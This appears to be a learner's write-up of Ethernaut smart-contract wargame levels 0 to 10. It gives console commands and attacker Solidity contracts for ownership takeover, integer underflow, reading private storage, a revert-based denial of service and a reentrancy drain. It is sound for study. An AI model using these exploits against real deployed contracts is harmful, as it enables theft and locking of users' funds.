## Ethernaut Level 0: Hello Ethernaut

## Commands Used

### 1. Called info() to get the initial clue
```
await contract.info()
```
**Output:**  
`"You will find what you need in info1()."`

This was the first hint given in the level.

---

### 2. Inspected the contract object
```
await contract
```
To check what functions are available in the contract. I noticed a password() function.

---

### 3. Retrieved the password
```
await contract.password()
```
**Output:**  
`"ethernaut0"`

This is the password needed for authentication.

---

### 4. Submitted the password directly
```
await contract.authenticate(await contract.password())
```
**Output:**  
Transaction successful

### 5. Clicked "Submit Instance"  
Level completed 

## Output Proof
![Level Complete Output](assets/Hello_Ethernaut.png)
![2](assets/Hello_Ethernaut(1).png)


# Ethernaut Level 1: Fallback

##  Strategy

The fallback function in this contract sets msg.sender as the new owner only if:
1. The caller sends ETH to the contract and
2. The caller has already contributed some ether via the contribute() function.

Also, the initial owner starts with `1000 ether` in contributions, so our total contribution must exceed that to trigger ownership update via contribute(). 

---

## Commands Used

### 1. Contributed a small amount to initialize `contributions[msg.sender] > 0`
```
await contract.contribute({value: toWei("0.0005")})
```
Enables the fallback function condition `contributions[msg.sender] > 0`.

---

### 2. Sent ETH directly to the contract to trigger the fallback function
```
await web3.eth.sendTransaction({from: player, to: contract.address, value: web3.utils.toWei("0.0001", "ether")})
```
This calls the `receive()` function, which sets me as the new `owner` since I already had a contribution.

---

### 3. Called `withdraw()` to drain the balance
```
await contract.withdraw()
```
Now that I’m the owner, I can withdraw the contract’s balance and fulfill the final objective.

---

### 4. Level completed

![Level Complete Output](assets/Fallback.png)


# Ethernaut Level 2: Fallout

## Strategy

- **Vulnerability**: The constructor in this contract is incorrectly named `Fal1out`. In Solidity versions prior to 0.7.0, the constructor should match the contract's name.
- **Exploit**: Since `Fal1out()` is a public function , anyone can call it. By calling `Fal1out()`, I was able to set myself as the contract's owner.

---

## Commands Used

### 1. Called the misnamed constructor to claim ownership
```
await contract.Fal1out()
```
This allowed me to set myself as the owner of the contract, as it was not treated as a constructor but a regular public function.

---

### 2. Verified ownership
```
await contract.owner()
```
I got my address as the output, confirming that I am now the owner of the contract

To check that I successfully became the owner after calling `Fal1out()`.

---

## Level completed

![Level Complete Output](assets/Fallout.png)


# Ethernaut Level 3: Coin Flip

## Strategy

In this challenge, the `CoinFlip` contract simulates a coin flip by using the previous block's hash, which is not truly random. This hash can be predicted using the `blockhash()` function, making it possible to determine the outcome of the coin flip in advance.

---

## Commands Used

### 1. Get the contract instance address
```
await contract.address
```
This command was used to get the address of the deployed `CoinFlip` contract

---

### 2. Query the `consecutiveWins` after each successful guess
```
await contract.consecutiveWins()
```
I used this command 10 times to check the `consecutiveWins` value after each flip. Each time the guess was correct, the value increased, and I confirmed that the counter reached 10.

---

## Level completed
![Level Complete Output](assets/Coin_Flip.png)
![2](assets/Coin_Flip(1).png)


# Ethernaut Level 4: Telephone

## Strategy

In this challenge, the `Telephone` contract has a function `changeOwner()` that allows the owner to be changed under certain conditions. The key condition here is that the contract checks whether the transaction origin (`tx.origin`) is different from the caller's address (`msg.sender`). This check is the key vulnerability, as it allows an attacker to use an intermediate contract to manipulate the `tx.origin` value and bypass the owner check.

### Steps:
1. **Understanding the Vulnerability**: The `tx.origin` is the address that initiated the transaction, and it will be different from the contract address when the contract is called by another contract. This condition allows the ownership to be transferred by a contract calling the `changeOwner()` function.
2. **Exploiting the Vulnerability**: I wrote an intermediate contract that calls the `changeOwner()` function of the target `Telephone` contract, passing the contract’s address (`msg.sender`) to satisfy the condition and change the owner of the `Telephone` contract.

---

## Commands Used

### 1. Creating an Interface to Interact with the `Telephone` Contract
```
interface ITelephone {
  function changeOwner(address _owner) external;
}
```
I created an interface (`ITelephone`) to interact with the `Telephone` contract. This allows me to call the `changeOwner()` function on the contract from another contract.

---

### 2. Intermediate Contract to Exploit the Vulnerability
```
contract IntermediateContract {
  function changeOwner(address _addr) public {
    ITelephone(_addr).changeOwner(msg.sender);
  }
}
```
This contract acts as an intermediary. It calls the `changeOwner()` function of the target `Telephone` contract, passing the caller's address (`msg.sender`) as the new owner. Since the check `tx.origin != msg.sender` is bypassed, the ownership is transferred successfully.

---

### Explanation of the Exploit:
- The `Telephone` contract uses `tx.origin` to restrict who can change the owner. `tx.origin` refers to the original address that initiated the transaction, and in this case, it checks if the transaction origin is not the same as the caller.
- By using an intermediate contract, I bypassed this check because `msg.sender` (the contract address) is different from `tx.origin` (my address). The intermediate contract successfully called the `changeOwner()` function, transferring the ownership of the `Telephone` contract to my address.

### 3. Executing in Remix IDE
After deploying both the `Telephone` contract and the `IntermediateContract` on Remix IDE, I called the `changeOwner()` function on the intermediate contract to transfer ownership of the `Telephone` contract to my address.

---

### 4. **Query the ownership to confirm the change:**

```
await contract.owner()
```

## Level completed
![Level Complete Output](assets/Telephone.png)


# Ethernaut Level 5: Token

## Strategy

- **Vulnerability**: The `transfer` function in the contract does not safely check for underflows. It subtracts the transfer amount from the sender’s balance before performing the check, and since the Solidity version is ^0.6.0 (before built-in overflow checks), this leads to an integer underflow vulnerability.
- **Exploit**: By trying to transfer more tokens than I actually had (21 tokens when I only had 20), the subtraction underflows and sets my balance to a very large number, allowing me to pass the level.

---

## Commands Used

### 1. Get the contract instance
```
let instance = await contract;
```
To interact with the deployed Token contract instance.

---

### 2. Called the `transfer` function with more than 20 tokens
```
await instance.transfer("0x0000000000000000000000000000000000000001", 21);
```
This triggers the underflow vulnerability and results in a huge balance increase for the player.

---

### 3. Checked the player’s balance
```
(await instance.balanceOf(player)).toString();
```
To verify that my token balance is now much larger than the original 20 tokens.

---

## Level completed
![Level Complete Output](assets/Token.png)



# Ethernaut Level 6: Delegation

## Strategy

- **Vulnerability**: The `Delegation` contract has a `fallback()` function that uses `delegatecall` to forward all unknown calls to the `Delegate` contract. Since `delegatecall` runs in the context of the calling contract’s storage, executing the `pwn()` function from `Delegate` via `delegatecall` will modify `Delegation`'s `owner` instead.
- **Exploit**: By sending a transaction directly to `Delegation` with the function selector for `pwn()`, we can trick the fallback into calling `Delegate.pwn()` and thus take over ownership.

---

## Commands Used

### 1. Get the instance address
```
contract.address
```
To confirm the deployed contract's address.

---

### 2. Set the instance variable to contract address
```
let instance = "0xinstance_address";
```
To specify the instance we are attacking.

---

### 3. Get the player’s account
```
let player = (await web3.eth.getAccounts())[0];
```
To get the sender address (your player address).

---

### 4. Send the function selector of `pwn()` to the contract
```
await web3.eth.sendTransaction({
  from: player,
  to: instance,
  data: "0xdd365b8b"
});
```
`"0xdd365b8b"` is the function selector for `pwn()`. Sending this directly invokes the fallback in `Delegation`, which performs a delegatecall to `Delegate.pwn()`—setting `msg.sender` (player) as the new `owner`.

---

### 5. Check if ownership has changed
```
await contract.owner()
```
To verify that the `owner` is now the player.

---

## Level completed
![Level Complete Output](assets/Delegation.png)


# Ethernaut Level 7: Force

## Strategy

- **Vulnerability**: The `Force` contract does not implement either `receive()` or `fallback()` functions, which means it rejects any direct transfer of ETH using `send()`, `transfer()`, or even `call{value: ...}`.
- **Exploit**: We bypass this restriction by using the `selfdestruct()` function in another contract. When a contract self-destructs, it forcibly sends its balance to the specified address, regardless of whether that address can normally receive ETH. This allows us to inject ETH into `Force`.

---

## Commands Used

### 1. Create an attack contract with `selfdestruct`
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor() payable {}

    function destroy(address payable _target) public {
        selfdestruct(_target);
    }
}
```
The `destroy()` function will forcefully send ETH to the `Force` contract's address.

---

### 2. Deployed `ForceAttack` with 1 Wei

To give the contract some balance that it can push to the target via `selfdestruct`.

---

### 3. Call the `destroy()` function with the Force instance address
```
await contract.destroy("0xD8b97663115cc3889479Eb5955E28F68025B2AD9")
```
To execute `selfdestruct` and force ETH into the `Force` contract.

---

### 4. Confirm the contract balance is now greater than 0
```
await web3.eth.getBalance("0xD8b97663115cc3889479Eb5955E28F68025B2AD9")
```
This confirms the ETH was successfully transferred and the level is complete.

---

## Level completed
![Level Complete Output](assets/Force.png)

# Ethernaut Level 8: Vault

## Strategy

- **Vulnerability**: Although the password is marked as `private`, Solidity stores all contract storage on-chain and it can be read using `web3.eth.getStorageAt`. The `password` is located at storage slot 1.
- **Exploit**: We read the private storage directly from the contract, extract the password, and use it to call the `unlock()` function to set `locked = false`.

---

## Commands Used

### 1. Get the password from storage slot 1
```
await web3.eth.getStorageAt(instance, 1)
```
The password is stored at slot 1. This reveals the raw `bytes32` value.

---

### 2. Decode the password to readable ASCII
```
web3.utils.hexToAscii("0x...")  // Use the result from the previous step
```
**Output**: `"A very strong secret password : )"`

---

### 3. Convert the password back to bytes32 format
```
let password = web3.utils.asciiToHex("A very strong secret password : )");
```
The contract's `unlock()` function expects a `bytes32` argument, so the string needs to be converted back.

---

### 4. Unlock the vault
```
await contract.unlock(password);
```

---

### 5. Check if the vault is unlocked
```
await contract.locked();
```
**Output**: `false`

---

## Level completed
![Level Complete Output](assets/Vault.png)


# Ethernaut Level 9: King

## Strategy

- **Vulnerability**: The `King` contract relied on sending Ether to the previous king using `.transfer()`. If the previous king was a smart contract that reverted in its `receive()` function, the transaction would fail, and the new king couldn’t be replaced — effectively locking the contract.
- **Exploit**: I deployed a malicious contract (`KingAttack`) that:
  1. Sent more Ether than the current `prize` to claim kingship.
  2. Reverted any future Ether transfers via its `receive()` function.
- **Outcome**: When Ethernaut’s level logic attempted to reclaim kingship, it failed due to the revert, and I remained the king — completing the level.

---

## Commands Used

### 1. Checked the current balance of the King contract
```
(await web3.eth.getBalance("0x72DF418D0D0F0A30625aB7F6cCE70eA7218b2168")).toString()
```
I used this command to find the current `prize` amount, so I could send a higher amount and become the new king.

**Output**: `"1000000000000000"` (1,000,000,000,000,000 wei)

---

### 2. Deployed the `KingAttack` contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address public target;

    constructor(address _target) payable {
        target = _target;
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Failed to become king");
    }

    receive() external payable {
        revert("Nope!");
    }
}
```

**Deployment Parameters**:
- Target address: the `King` contract instance address.
- Value sent: `1,100,000,000,000,000 wei` (more than the current prize).

**Reason**:  
I used the constructor to immediately send Ether to the King contract and claim the throne. The `receive()` function reverted any further Ether transfers, preventing anyone — including the level itself — from dethroning my contract.

---

### 3. Verified kingship
```
await contract._king();
```

I used this to confirm that my `KingAttack` contract had become the new king.

**Output**: Address of the `KingAttack` contract

---

## Level Completed
![Level Complete Output](assets/King.png)

# Ethernaut Level 10: Re-entrancy

## Strategy

- **Vulnerability**: The `Reentrance` contract allowed a re-entrant call to `withdraw()` *before* updating the user's balance, due to calling `msg.sender.call.value()` first. This made it vulnerable to **reentrancy attacks**.
- **Exploit**: I wrote and deployed a malicious contract (`ReentranceAttack`) that:
  1. Donated a small amount of Ether to itself in the target contract.
  2. Called `withdraw()` which triggered the fallback `receive()` function.
  3. The `receive()` function recursively called `withdraw()` again, draining the contract before the balance was updated.
- **Outcome**: I successfully drained all funds from the target contract and completed the level.

---

### Prepared the `ReentranceAttack` Contract

I created a new file called `ReentranceAttack.sol` in Remix and pasted the following code:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    address payable public target;
    address public owner;

    constructor(address _targetAddress) public {
        target = payable(_targetAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Send some ETH");
        IReentrance(target).donate{value: msg.value}(address(this));
        IReentrance(target).withdraw(msg.value);
    }

    receive() external payable {
        uint256 targetBalance = address(target).balance;
        if (targetBalance > 0) {
            uint256 withdrawAmount = targetBalance > 0.001 ether ? 0.001 ether : targetBalance;
            IReentrance(target).withdraw(withdrawAmount);
        }
    }

    function withdrawFunds() public {
        require(msg.sender == owner, "Not owner");
        msg.sender.transfer(address(this).balance);
    }
}
```

---

### Compiled the Contract

- I used Solidity compiler version `0.6.12` to match the version used by the level.
- Clicked **Compile ReentranceAttack.sol**.

---

### Deployed the Attack Contract

- Switched to **Injected Web3** in Remix (connected to Sepolia testnet via MetaMask).
- Provided the **instance address of the Reentrance contract** as the constructor argument.
- Deployed the contract with `0.001 ETH`.

---

### Executed the Attack

- Called the `attack()` function with `0.001 ETH`.
- The attack recursively called `withdraw()` through the fallback `receive()` function, draining the contract balance.

To monitor the balance of the target contract, I ran:
```
(await web3.eth.getBalance(instance)).toString()
```
Once the balance reached `0`, I confirmed the attack was successful.

---

### Step 6: Submitted the Level

- After confirming the contract’s balance was `0`, I submitted the level on Ethernaut — and it was marked complete.

---

## Level Completed
![Level Complete Output](assets/Re-entracy.png)
![Level Complete Output](assets/Re-entrancy(1).png)

